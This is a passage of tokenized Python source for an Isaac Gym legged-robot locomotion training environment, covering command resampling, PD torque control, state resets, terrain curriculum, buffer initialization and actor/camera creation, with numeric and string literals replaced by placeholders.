<NUM_LIT> ] , size = ( <NUM_LIT> , ) ) <EOL> props [ <NUM_LIT> ] . com += gymapi . Vec3 ( * rand_com ) <EOL> else : <EOL> rand_com = np . zeros ( <NUM_LIT> ) <EOL> mass_params = np . concatenate ( [ rand_mass , rand_com ] ) <EOL> return props , mass_params <EOL> def _post_physics_step_callback ( self ) : <EOL> env_ids = ( self . episode_length_buf % int ( self . cfg . commands . resampling_time / self . dt ) == <NUM_LIT> ) <EOL> self . _resample_commands ( env_ids . nonzero ( as_tuple = False ) . flatten ( ) ) <EOL> if self . cfg . commands . heading_command : <EOL> forward = quat_apply ( self . base_quat , self . forward_vec ) <EOL> heading = torch . atan2 ( forward [ : , <NUM_LIT> ] , forward [ : , <NUM_LIT> ] ) <EOL> self . commands [ : , <NUM_LIT> ] = torch . clip ( <NUM_LIT> * wrap_to_pi ( self . commands [ : , <NUM_LIT> ] - heading ) , - <NUM_LIT> , <NUM_LIT> ) <EOL> self . commands [ : , <NUM_LIT> ] *= torch . abs ( self . commands [ : , <NUM_LIT> ] ) > self . cfg . commands . ang_vel_clip <EOL> if self . cfg . terrain . measure_heights : <EOL> if self . global_counter % self . cfg . depth . update_interval == <NUM_LIT> : <EOL> self . measured_heights = self . _get_heights ( ) <EOL> if self . cfg . domain_rand . push_robots and ( self . common_step_counter % self . cfg . domain_rand . push_interval == <NUM_LIT> ) : <EOL> self . _push_robots ( ) <EOL> def _gather_cur_goals ( self , future = <NUM_LIT> ) : <EOL> return self . env_goals . gather ( <NUM_LIT> , ( self . cur_goal_idx [ : , None , None ] + future ) . expand ( - <NUM_LIT> , - <NUM_LIT> , self . env_goals . shape [ - <NUM_LIT> ] ) ) . squeeze ( <NUM_LIT> ) <EOL> def _resample_commands ( self , env_ids ) : <EOL> self . commands [ env_ids , <NUM_LIT> ] = torch_rand_float ( self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> if self . cfg . commands . heading_command : <EOL> self . commands [ env_ids , <NUM_LIT> ] = torch_rand_float ( self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> else : <EOL> self . commands [ env_ids , <NUM_LIT> ] = torch_rand_float ( self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> self . commands [ env_ids , <NUM_LIT> ] *= torch . abs ( self . commands [ env_ids , <NUM_LIT> ] ) > self . cfg . commands . ang_vel_clip <EOL> self . commands [ env_ids , : <NUM_LIT> ] *= torch . abs ( self . commands [ env_ids , <NUM_LIT> : <NUM_LIT> ] ) > self . cfg . commands . lin_vel_clip <EOL> def _compute_torques ( self , actions ) : <EOL> actions_scaled = actions * self . cfg . control . action_scale <EOL> control_type = self . cfg . control . control_type <EOL> if control_type == "<STR_LIT>" : <EOL> if not self . cfg . domain_rand . randomize_motor : <EOL> torques = self . p_gains * ( actions_scaled + self . default_dof_pos_all - self . dof_pos ) - self . d_gains * self . dof_vel <EOL> else : <EOL> torques = self . motor_strength [ <NUM_LIT> ] * self . p_gains * ( actions_scaled + self . default_dof_pos_all - self . dof_pos ) - self . motor_strength [ <NUM_LIT> ] * self . d_gains * self . dof_vel <EOL> elif control_type == "<STR_LIT>" : <EOL> torques = self . p_gains * ( actions_scaled - self . dof_vel ) - self . d_gains * ( self . dof_vel - self . last_dof_vel ) / self . sim_params . dt <EOL> elif control_type == "<STR_LIT>" : <EOL> torques = actions_scaled <EOL> else : <EOL> raise NameError ( f"<STR_LIT>" ) <EOL> return torch . clip ( torques , - self . torque_limits , self . torque_limits ) <EOL> def _reset_dofs ( self , env_ids ) : <EOL> self . dof_pos [ env_ids ] = self . default_dof_pos + torch_rand_float ( <NUM_LIT> , <NUM_LIT> , ( len ( env_ids ) , self . num_dof ) , device = self . device ) <EOL> self . dof_vel [ env_ids ] = <NUM_LIT> <EOL> env_ids_int32 = env_ids . to ( dtype = torch . int32 ) <EOL> self . gym . set_dof_state_tensor_indexed ( self . sim , <EOL> gymtorch . unwrap_tensor ( self . dof_state ) , <EOL> gymtorch . unwrap_tensor ( env_ids_int32 ) , len ( env_ids_int32 ) ) <EOL> def _reset_root_states ( self , env_ids ) : <EOL> if self . custom_origins : <EOL> self . root_states [ env_ids ] = self . base_init_state <EOL> self . root_states [ env_ids , : <NUM_LIT> ] += self . env_origins [ env_ids ] <EOL> if self . cfg . env . randomize_start_pos : <EOL> self . root_states [ env_ids , : <NUM_LIT> ] += torch_rand_float ( - <NUM_LIT> , <NUM_LIT> , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) <EOL> if self . cfg . env . randomize_start_yaw : <EOL> rand_yaw = self . cfg . env . rand_yaw_range * torch_rand_float ( - <NUM_LIT> , <NUM_LIT> , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> if self . cfg . env . randomize_start_pitch : <EOL> rand_pitch = self . cfg . env . rand_pitch_range * torch_rand_float ( - <NUM_LIT> , <NUM_LIT> , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> else : <EOL> rand_pitch = torch . zeros ( len ( env_ids ) , device = self . device ) <EOL> quat = quat_from_euler_xyz ( <NUM_LIT> * rand_yaw , rand_pitch , rand_yaw ) <EOL> self . root_states [ env_ids , <NUM_LIT> : <NUM_LIT> ] = quat [ : , : ] <EOL> if self . cfg . env . randomize_start_y : <EOL> self . root_states [ env_ids , <NUM_LIT> ] += self . cfg . env . rand_y_range * torch_rand_float ( - <NUM_LIT> , <NUM_LIT> , ( len ( env_ids ) , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> else : <EOL> self . root_states [ env_ids ] = self . base_init_state <EOL> self . root_states [ env_ids , : <NUM_LIT> ] += self . env_origins [ env_ids ] <EOL> env_ids_int32 = env_ids . to ( dtype = torch . int32 ) <EOL> self . gym . set_actor_root_state_tensor_indexed ( self . sim , <EOL> gymtorch . unwrap_tensor ( self . root_states ) , <EOL> gymtorch . unwrap_tensor ( env_ids_int32 ) , len ( env_ids_int32 ) ) <EOL> def _push_robots ( self ) : <EOL> max_vel = self . cfg . domain_rand . max_push_vel_xy <EOL> self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] = torch_rand_float ( - max_vel , max_vel , ( self . num_envs , <NUM_LIT> ) , device = self . device ) <EOL> self . gym . set_actor_root_state_tensor ( self . sim , gymtorch . unwrap_tensor ( self . root_states ) ) <EOL> def _update_terrain_curriculum ( self , env_ids ) : <EOL> if not self . init_done : <EOL> return <EOL> dis_to_origin = torch . norm ( self . root_states [ env_ids , : <NUM_LIT> ] - self . env_origins [ env_ids , : <NUM_LIT> ] , dim = <NUM_LIT> ) <EOL> threshold = self . commands [ env_ids , <NUM_LIT> ] * self . cfg . env . episode_length_s <EOL> move_up = dis_to_origin > <NUM_LIT> * threshold <EOL> move_down = dis_to_origin < <NUM_LIT> * threshold <EOL> self . terrain_levels [ env_ids ] += <NUM_LIT> * move_up - <NUM_LIT> * move_down <EOL> self . terrain_levels [ env_ids ] = torch . where ( self . terrain_levels [ env_ids ] >= self . max_terrain_level , <EOL> torch . randint_like ( self . terrain_levels [ env_ids ] , self . max_terrain_level ) , <EOL> torch . clip ( self . terrain_levels [ env_ids ] , <NUM_LIT> ) ) <EOL> self . env_origins [ env_ids ] = self . terrain_origins [ self . terrain_levels [ env_ids ] , self . terrain_types [ env_ids ] ] <EOL> self . env_class [ env_ids ] = self . terrain_class [ self . terrain_levels [ env_ids ] , self . terrain_types [ env_ids ] ] <EOL> temp = self . terrain_goals [ self . terrain_levels , self . terrain_types ] <EOL> last_col = temp [ : , - <NUM_LIT> ] . unsqueeze ( <NUM_LIT> ) <EOL> self . env_goals [ : ] = torch . cat ( ( temp , last_col . repeat ( <NUM_LIT> , self . cfg . env . num_future_goal_obs , <NUM_LIT> ) ) , dim = <NUM_LIT> ) [ : ] <EOL> self . cur_goals = self . _gather_cur_goals ( ) <EOL> self . next_goals = self . _gather_cur_goals ( future = <NUM_LIT> ) <EOL> def _init_buffers ( self ) : <EOL> actor_root_state = self . gym . acquire_actor_root_state_tensor ( self . sim ) <EOL> dof_state_tensor = self . gym . acquire_dof_state_tensor ( self . sim ) <EOL> net_contact_forces = self . gym . acquire_net_contact_force_tensor ( self . sim ) <EOL> force_sensor_tensor = self . gym . acquire_force_sensor_tensor ( self . sim ) <EOL> rigid_body_state_tensor = self . gym . acquire_rigid_body_state_tensor ( self . sim ) <EOL> self . gym . refresh_dof_state_tensor ( self . sim ) <EOL> self . gym . refresh_actor_root_state_tensor ( self . sim ) <EOL> self . gym . refresh_net_contact_force_tensor ( self . sim ) <EOL> self . gym . refresh_rigid_body_state_tensor ( self . sim ) <EOL> self . gym . refresh_force_sensor_tensor ( self . sim ) <EOL> self . root_states = gymtorch . wrap_tensor ( actor_root_state ) <EOL> self . rigid_body_states = gymtorch . wrap_tensor ( rigid_body_state_tensor ) . view ( self . num_envs , - <NUM_LIT> , <NUM_LIT> ) <EOL> self . dof_state = gymtorch . wrap_tensor ( dof_state_tensor ) <EOL> self . dof_pos = self . dof_state . view ( self . num_envs , self . num_dof , <NUM_LIT> ) [ ... , <NUM_LIT> ] <EOL> self . dof_vel = self . dof_state . view ( self . num_envs , self . num_dof , <NUM_LIT> ) [ ... , <NUM_LIT> ] <EOL> self . base_quat = self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] <EOL> self . force_sensor_tensor = gymtorch . wrap_tensor ( force_sensor_tensor ) . view ( self . num_envs , <NUM_LIT> , <NUM_LIT> ) <EOL> self . contact_forces = gymtorch . wrap_tensor ( net_contact_forces ) . view ( self . num_envs , - <NUM_LIT> , <NUM_LIT> ) <EOL> self . common_step_counter = <NUM_LIT> <EOL> self . extras = { } <EOL> self . gravity_vec = to_torch ( get_axis_params ( - <NUM_LIT> , self . up_axis_idx ) , device = self . device ) . repeat ( ( self . num_envs , <NUM_LIT> ) ) <EOL> self . forward_vec = to_torch ( [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , device = self . device ) . repeat ( ( self . num_envs , <NUM_LIT> ) ) <EOL> self . torques = torch . zeros ( self . num_envs , self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . p_gains = torch . zeros ( self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . d_gains = torch . zeros ( self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . actions = torch . zeros ( self . num_envs , self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . last_actions = torch . zeros ( self . num_envs , self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . last_dof_vel = torch . zeros_like ( self . dof_vel ) <EOL> self . last_torques = torch . zeros_like ( self . torques ) <EOL> self . last_root_vel = torch . zeros_like ( self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> self . reach_goal_timer = torch . zeros ( self . num_envs , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> str_rng = self . cfg . domain_rand . motor_strength_range <EOL> self . motor_strength = ( str_rng [ <NUM_LIT> ] - str_rng [ <NUM_LIT> ] ) * torch . rand ( <NUM_LIT> , self . num_envs , self . num_actions , dtype = torch . float , device = self . device , requires_grad = False ) + str_rng [ <NUM_LIT> ] <EOL> if self . cfg . env . history_encoding : <EOL> self . obs_history_buf = torch . zeros ( self . num_envs , self . cfg . env . history_len , self . cfg . env . n_proprio , device = self . device , dtype = torch . float ) <EOL> self . action_history_buf = torch . zeros ( self . num_envs , self . cfg . domain_rand . action_buf_len , self . num_dofs , device = self . device , dtype = torch . float ) <EOL> self . contact_buf = torch . zeros ( self . num_envs , self . cfg . env . contact_buf_len , <NUM_LIT> , device = self . device , dtype = torch . float ) <EOL> self . commands = torch . zeros ( self . num_envs , self . cfg . commands . num_commands , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . _resample_commands ( torch . arange ( self . num_envs , device = self . device , requires_grad = False ) ) <EOL> self . commands_scale = torch . tensor ( [ self . obs_scales . lin_vel , self . obs_scales . lin_vel , self . obs_scales . ang_vel ] , device = self . device , requires_grad = False , ) <EOL> self . feet_air_time = torch . zeros ( self . num_envs , self . feet_indices . shape [ <NUM_LIT> ] , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . last_contacts = torch . zeros ( self . num_envs , len ( self . feet_indices ) , dtype = torch . bool , device = self . device , requires_grad = False ) <EOL> self . base_lin_vel = quat_rotate_inverse ( self . base_quat , self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> self . base_ang_vel = quat_rotate_inverse ( self . base_quat , self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> self . projected_gravity = quat_rotate_inverse ( self . base_quat , self . gravity_vec ) <EOL> if self . cfg . terrain . measure_heights : <EOL> self . height_points = self . _init_height_points ( ) <EOL> self . measured_heights = <NUM_LIT> <EOL> self . default_dof_pos = torch . zeros ( self . num_dof , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . default_dof_pos_all = torch . zeros ( self . num_envs , self . num_dof , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> for i in range ( self . num_dofs ) : <EOL> name = self . dof_names [ i ] <EOL> angle = self . cfg . init_state . default_joint_angles [ name ] <EOL> self . default_dof_pos [ i ] = angle <EOL> found = False <EOL> for dof_name in self . cfg . control . stiffness . keys ( ) : <EOL> if dof_name in name : <EOL> self . p_gains [ i ] = self . cfg . control . stiffness [ dof_name ] <EOL> self . d_gains [ i ] = self . cfg . control . damping [ dof_name ] <EOL> found = True <EOL> if not found : <EOL> self . p_gains [ i ] = <NUM_LIT> <EOL> self . d_gains [ i ] = <NUM_LIT> <EOL> if self . cfg . control . control_type in [ "<STR_LIT>" , "<STR_LIT>" ] : <EOL> print ( f"<STR_LIT>" ) <EOL> self . default_dof_pos = self . default_dof_pos . unsqueeze ( <NUM_LIT> ) <EOL> self . default_dof_pos_all [ : ] = self . default_dof_pos [ <NUM_LIT> ] <EOL> self . height_update_interval = <NUM_LIT> <EOL> if hasattr ( self . cfg . env , "<STR_LIT>" ) : <EOL> self . height_update_interval = int ( self . cfg . env . height_update_dt / ( self . cfg . sim . dt * self . cfg . control . decimation ) ) <EOL> if self . cfg . depth . use_camera : <EOL> self . depth_buffer = torch . zeros ( self . num_envs , <EOL> self . cfg . depth . buffer_len , <EOL> self . cfg . depth . resized [ <NUM_LIT> ] , <EOL> self . cfg . depth . resized [ <NUM_LIT> ] ) . to ( self . device ) <EOL> def _prepare_reward_function ( self ) : <EOL> for key in list ( self . reward_scales . keys ( ) ) : <EOL> scale = self . reward_scales [ key ] <EOL> if scale == <NUM_LIT> : <EOL> self . reward_scales . pop ( key ) <EOL> else : <EOL> self . reward_scales [ key ] *= self . dt <EOL> self . reward_functions = [ ] <EOL> self . reward_names = [ ] <EOL> for name , scale in self . reward_scales . items ( ) : <EOL> if name == "<STR_LIT>" : <EOL> continue <EOL> self . reward_names . append ( name ) <EOL> name = '<STR_LIT>' + name <EOL> self . reward_functions . append ( getattr ( self , name ) ) <EOL> self . episode_sums = { name : torch . zeros ( self . num_envs , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> for name in self . reward_scales . keys ( ) } <EOL> def _create_ground_plane ( self ) : <EOL> plane_params = gymapi . PlaneParams ( ) <EOL> plane_params . normal = gymapi . Vec3 ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> plane_params . static_friction = self . cfg . terrain . static_friction <EOL> plane_params . dynamic_friction = self . cfg . terrain . dynamic_friction <EOL> plane_params . restitution = self . cfg . terrain . restitution <EOL> self . gym . add_ground ( self . sim , plane_params ) <EOL> def _create_heightfield ( self ) : <EOL> hf_params = gymapi . HeightFieldParams ( ) <EOL> hf_params . column_scale = self . cfg . terrain . horizontal_scale <EOL> hf_params . row_scale = self . cfg . terrain . horizontal_scale <EOL> hf_params . vertical_scale = self . cfg . terrain . vertical_scale <EOL> hf_params . nbRows = self . terrain . tot_cols <EOL> hf_params . nbColumns = self . terrain . tot_rows <EOL> hf_params . transform . p . x = - self . terrain . border <EOL> hf_params . transform . p . y = - self . terrain . border <EOL> hf_params . transform . p . z = <NUM_LIT> <EOL> hf_params . static_friction = self . cfg . terrain . static_friction <EOL> hf_params . dynamic_friction = self . cfg . terrain . dynamic_friction <EOL> hf_params . restitution = self . cfg . terrain . restitution <EOL> self . gym . add_heightfield ( self . sim , self . terrain . heightsamples . flatten ( order = '<STR_LIT>' ) , hf_params ) <EOL> self . height_samples = torch . tensor ( self . terrain . heightsamples ) . view ( self . terrain . tot_rows , self . terrain . tot_cols ) . to ( self . device ) <EOL> def _create_trimesh ( self ) : <EOL> tm_params = gymapi . TriangleMeshParams ( ) <EOL> tm_params . nb_vertices = self . terrain . vertices . shape [ <NUM_LIT> ] <EOL> tm_params . nb_triangles = self . terrain . triangles . shape [ <NUM_LIT> ] <EOL> tm_params . transform . p . x = - self . terrain . cfg . border_size <EOL> tm_params . transform . p . y = - self . terrain . cfg . border_size <EOL> tm_params . transform . p . z = <NUM_LIT> <EOL> tm_params . static_friction = self . cfg . terrain . static_friction <EOL> tm_params . dynamic_friction = self . cfg . terrain . dynamic_friction <EOL> tm_params . restitution = self . cfg . terrain . restitution <EOL> print ( "<STR_LIT>" ) <EOL> self . gym . add_triangle_mesh ( self . sim , self . terrain . vertices . flatten ( order = '<STR_LIT>' ) , self . terrain . triangles . flatten ( order = '<STR_LIT>' ) , tm_params ) <EOL> print ( "<STR_LIT>" ) <EOL> self . height_samples = torch . tensor ( self . terrain . heightsamples ) . view ( self . terrain . tot_rows , self . terrain . tot_cols ) . to ( self . device ) <EOL> self . x_edge_mask = torch . tensor ( self . terrain . x_edge_mask ) . view ( self . terrain . tot_rows , self . terrain . tot_cols ) . to ( self . device ) <EOL> def attach_camera ( self , i , env_handle , actor_handle ) : <EOL> if self . cfg . depth . use_camera : <EOL> config = self . cfg . depth <EOL> camera_props = gymapi . CameraProperties ( ) <EOL> camera_props . width = self . cfg . depth . original [ <NUM_LIT> ] <EOL> camera_props . height = self . cfg . depth . original [ <NUM_LIT> ] <EOL> camera_props . enable_tensors = True <EOL> camera_horizontal_fov = self . cfg . depth . horizontal_fov <EOL> camera_props . horizontal_fov = camera_horizontal_fov <EOL> camera_handle = self . gym . create_camera_sensor ( env_handle , camera_props ) <EOL> self . cam_handles . append ( camera_handle ) <EOL> local_transform = gymapi . Transform ( ) <EOL> camera_position = np . copy ( config . position ) <EOL> camera_angle = np . random . uniform ( config . angle [ <NUM_LIT> ] , config . angle [ <NUM_LIT> ] ) <EOL> local_transform . p = gymapi . Vec3 ( * camera_position ) <EOL> local_transform . r = gymapi . Quat . from_euler_zyx ( <NUM_LIT> , np . radians ( camera_angle ) , <NUM_LIT> ) <EOL> root_handle = self . gym . get_actor_root_rigid_body_handle ( env_handle , actor_handle ) <EOL> self . gym . attach_camera_to_body ( camera_handle , env_handle , root_handle , local_transform , gymapi . FOLLOW_TRANSFORM ) <EOL> def _create_envs ( self ) : <EOL> asset_path = self . cfg . asset . file . format ( LEGGED_GYM_ROOT_DIR = LEGGED_GYM_ROOT_DIR ) <EOL> asset_root = os . path . dirname ( asset_path ) <EOL> asset_file = os . path . basename ( asset_path ) <EOL> asset_options = gymapi . AssetOptions ( ) <EOL> asset_options . default_dof_drive_mode = self . cfg . asset . default_dof_drive_mode <EOL> asset_options . collapse_fixed_joints = self . cfg . asset . collapse_fixed_joints <EOL> asset_options . replace_cylinder_with_capsule = self . cfg . asset . replace_cylinder_with_capsule <EOL> asset_options . flip_visual_attachments = self . cfg . asset . flip_visual_attachments <EOL> asset_options . fix_base_link = self . cfg . asset . fix_base_link <EOL> asset_options . density = self . cfg . asset . density <EOL> asset_options . angular_damping = self . cfg . asset . angular_damping <EOL> asset_options . linear_damping = self . cfg . asset . linear_damping <EOL> asset_options . max_angular_velocity = self . cfg . asset . max_angular_velocity <EOL> asset_options . max_linear_velocity = self . cfg . asset . max_linear_velocity <EOL> asset_options . armature = self . cfg . asset . armature <EOL> asset_options . thickness = self . cfg . asset . thickness <EOL> asset_options . disable_gravity = self . cfg . asset . disable_gravity <EOL> robot_asset = self . gym . load_asset ( self . sim , asset_root , asset_file , asset_options ) <EOL> self . num_dof = self . gym . get_asset_dof_count ( robot_asset ) <EOL> self . num_bodies = self . gym . get_asset_rigid_body_count ( robot_asset ) <EOL> dof_props_asset = self . gym . get_asset_dof_properties ( robot_asset ) <EOL> rigid_shape_props_asset = self . gym . get_asset_rigid_shape_properties ( robot_asset ) <EOL> body_names = self . gym . get_asset_rigid_body_names ( robot_asset ) <EOL> self . dof_names = self . gym . get_asset_dof_names ( robot_asset ) <EOL> self . num_bodies = len ( body_names ) <EOL> self . num_dofs = len ( self . dof_names ) <EOL> feet_names = [ s for s in body_names if self . cfg . asset . foot_name in s ] <EOL> for s in [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] : <EOL> feet_idx = self . gym . find_asset_rigid_body_index ( robot_asset , s ) <EOL> sensor_pose = gymapi . Transform ( gymapi . Vec3 ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . gym . create_asset_force_sensor ( robot_asset , feet_idx , sensor_pose ) <EOL> penalized_contact_names = [ ] <EOL> for name in self . cfg . asset . penalize_contacts_on : <EOL> penalized_contact_names . extend ( [ s for s in body_names if name in s ] ) <EOL> termination_contact_names = [ ] <EOL> for name in self . cfg . asset . terminate_after_contacts_on : <EOL> termination_contact_names . extend ( [ s for s in body_names if name in s ] ) <EOL> base_init_state_list = self . cfg . init_state . pos + self . cfg . init_state . rot + self . cfg . init_state . lin_vel + self . cfg . init_state . ang_vel <EOL> self . base_init_state = to_torch ( base_init_state_list , device = self . device , requires_grad = False ) <EOL> start_pose = gymapi . Transform ( ) <EOL> start_pose . p = gymapi . Vec3 ( * self . base_init_state [ : <NUM_LIT> ] ) <EOL> self . _get_env_origins ( ) <EOL> env_lower = gymapi . Vec3 ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> env_upper = gymapi . Vec3 ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> self . actor_handles = [ ] <EOL> self . envs = [ ] <EOL> self . cam_handles = [ ] <EOL> self . cam_tensors = [ ] <EOL> self . mass_params_tensor = torch . zeros ( self . num_envs , <NUM_LIT> , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> print ( "<STR_LIT>" ) <EOL> for i in tqdm ( range ( self . num_envs ) ) : <EOL> env_handle = self . gym . create_env ( self . sim , env_lower , env_upper , int ( np . sqrt ( self . num_envs ) ) ) <EOL> pos = self . env_origins [ i ] . clone ( ) <EOL> if self . cfg . env . randomize_start_pos : <EOL> pos [ : <NUM_LIT> ] += torch_rand_float ( - <NUM_LIT> , <NUM_LIT> , ( <NUM_LIT> , <NUM_LIT> ) , device = self . device ) . squeeze ( <NUM_LIT> ) <EOL> if self . cfg . env . randomize_start_yaw : <EOL> rand_yaw_quat = gymapi . Quat . from_euler_zyx ( <NUM_LIT> , <NUM_LIT> , self . cfg . env . rand_yaw_range * np . random . uniform ( - <NUM_LIT> , <NUM_LIT> ) ) <EOL> start_pose . r = rand_yaw_quat <EOL> start_pose . p = gymapi . Vec3 ( * ( pos + self . base_init_state [ : <NUM_LIT> ] ) ) <EOL> rigid_shape_props = self . _process_rigid_shape_props ( rigid_shape_props_asset , i ) <EOL> self . gym . set_asset_rigid_shape_properties ( robot_asset , rigid_shape_props ) <EOL> anymal_handle = self . gym . create_actor ( env_handle , robot_asset , start_pose , "<STR_LIT>" , i , self . cfg . asset . self_collisions , <NUM_LIT> ) <EOL> dof_props = self . _process_dof_props ( dof_props_asset , i ) <EOL> self . gym . set_actor_dof_properties ( env_handle , anymal_handle , dof_props ) <EOL> body_props = self . gym . get_actor_rigid_body_properties ( env_handle , anymal_handle ) <EOL> body_props , mass_params = self . _process_rigid_body_props ( body_props , i ) <EOL> self . gym . set_actor_rigid_body_properties ( env_handle , anymal_handle , body_props , recomputeInertia = True ) <EOL> self . envs . append ( env_handle ) <EOL> self . actor_handles . append ( anymal_handle ) <EOL> self . attach_camera ( i , env_handle , anymal_handle ) <EOL> self . mass_params_tensor [ i , : ] = torch . from_numpy ( mass_params ) . to ( self . device ) . to ( torch . float ) <EOL> if self . cfg . domain_rand . randomize_friction : <EOL> self . friction_coeffs_tensor = self . friction_coeffs . to ( self . device ) . to ( torch . float ) . squeeze ( - <NUM_LIT> ) <EOL> self . feet_indices = torch . zeros ( len ( feet_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i in range ( len ( feet_names ) ) : <EOL> self . feet_indices [ i ] = self . gym . find_actor_rigid_body_handle ( self . envs [ <NUM_LIT> ] , self . actor_handles [ <NUM_LIT> ] , feet_names [ i ] ) <EOL> self . penalised_contact_indices = torch . zeros ( len ( penalized_contact_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i in range ( len ( penalized_contact_names ) ) : <EOL> self . penalised_contact_indices [ i ] = self . gym . find_actor_rigid_body_handle ( self . envs [ <NUM_LIT> ] , self . actor_handles [ <NUM_LIT> ] , penalized_contact_names [ i ] ) <EOL> self . termination_contact_indices = torch . zeros ( len ( termination_contact_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i in range ( len ( termination_contact_names ) ) : <EOL> self . termination_contact_indices [ i ] = self . gym . find_actor_rigid_body_handle ( self . envs [ <NUM_LIT> ] , self . actor_handles [ <NUM_LIT> ] , termination_contact_names [ i ] ) <EOL> hip_names = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> self . hip_indices = torch . zeros ( len ( hip_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i , name in enumerate ( hip_names ) : <EOL> self . hip_indices [ i ] = self . dof_names . index ( name ) <EOL> thigh_names = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> self . thigh_indices = torch . zeros ( len ( thigh_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i , name in enumerate ( thigh_names ) : <EOL> self . thigh_indices [ i ] = self . dof_names . index ( name ) <EOL> calf_names = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> self . calf_indices = torch . zeros ( len ( calf_names ) , dtype = torch . long , device = self . device , requires_grad = False ) <EOL> for i , name in enumerate ( calf_names ) : <EOL> self . calf_indices [ i ] = self . dof_names . index ( name ) <EOL> def _get_env_origins ( self ) : <EOL> if self . cfg . terrain . mesh_type in [ "<STR_LIT>" , "<STR_LIT>" ] : <EOL> self . custom_origins = True <EOL> self . env_origins = torch . zeros ( self . num_envs , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> self . env_class = torch . zeros ( self . num_envs , device = self . device , requires_grad = False ) <EOL> max_init_level = self . cfg . terrain . max_init_terrain_level <EOL> if not self . cfg . terrain . curriculum : max_init_level = self . cfg . terrain . num_rows - <NUM_LIT> <EOL> self . terrain_levels = torch . randint ( <NUM_LIT> , max_init_level + <NUM_LIT> , ( self . num_envs , ) , device = self . device ) <EOL> self . terrain_types = torch . div ( torch . arange ( self . num_envs , device = self . device ) , ( self . num_envs / self . cfg . terrain . num_cols ) , rounding_mode = '<STR_LIT>' ) . to ( torch . long ) <EOL> self . max_terrain_level = self . cfg . terrain . num_rows <EOL> self . terrain_origins = torch . from_numpy ( self . terrain . env_origins ) . to ( self . device ) . to ( torch . float ) <EOL> self . env_origins [ : ] = self . terrain_origins [ self . terrain_levels , self . terrain_types ] <EOL> self . terrain_class = torch . from_numpy ( self . terrain . terrain_type ) . to ( self . device ) . to ( torch . float ) <EOL> self . env_class [ : ] = self . terrain_class [ self . terrain_levels , self . terrain_types ] <EOL> self . terrain_goals = torch . from_numpy ( self . terrain . goals ) . to ( self . device ) . to ( torch . float ) <EOL> self . env_goals = torch . zeros ( self . num_envs , self . cfg . terrain . num_goals + self . cfg . env . num_future_goal_obs , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> self . cur_goal_idx = torch . zeros ( self . num_envs , device = self . device , requires_grad = False , dtype = torch . long ) <EOL> temp = self . terrain_goals [ self . terrain_levels , self . terrain_types ] <EOL> last_col = temp [ : , - <NUM_LIT> ] . unsqueeze ( <NUM_LIT> ) <EOL> self . env_goals [ : ] = torch . cat ( ( temp , last_col . repeat ( <NUM_LIT> , self . cfg . env . num_future_goal_obs , <NUM_LIT> ) ) , dim = <NUM_LIT> ) [ : ] <EOL> self . cur_goals = self . _gather_cur_goals ( ) <EOL> self . next_goals = self . _gather_cur_goals ( future = <NUM_LIT> ) <EOL> else : <EOL> self . custom_origins = False <EOL> self . env_origins = torch . zeros ( self . num_envs , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> num_cols = np . floor ( np . sqrt ( self . num_envs ) ) <EOL> num_rows = np . ceil ( self . num_envs / num_cols ) <EOL> xx , yy = torch . meshgrid ( torch . arange ( num_rows ) , torch . arange ( num_cols ) ) <EOL> spacing = self . cfg . env . env_spacing <EOL> self . env_origins [ : , <NUM_LIT> ] = spacing * xx . flatten 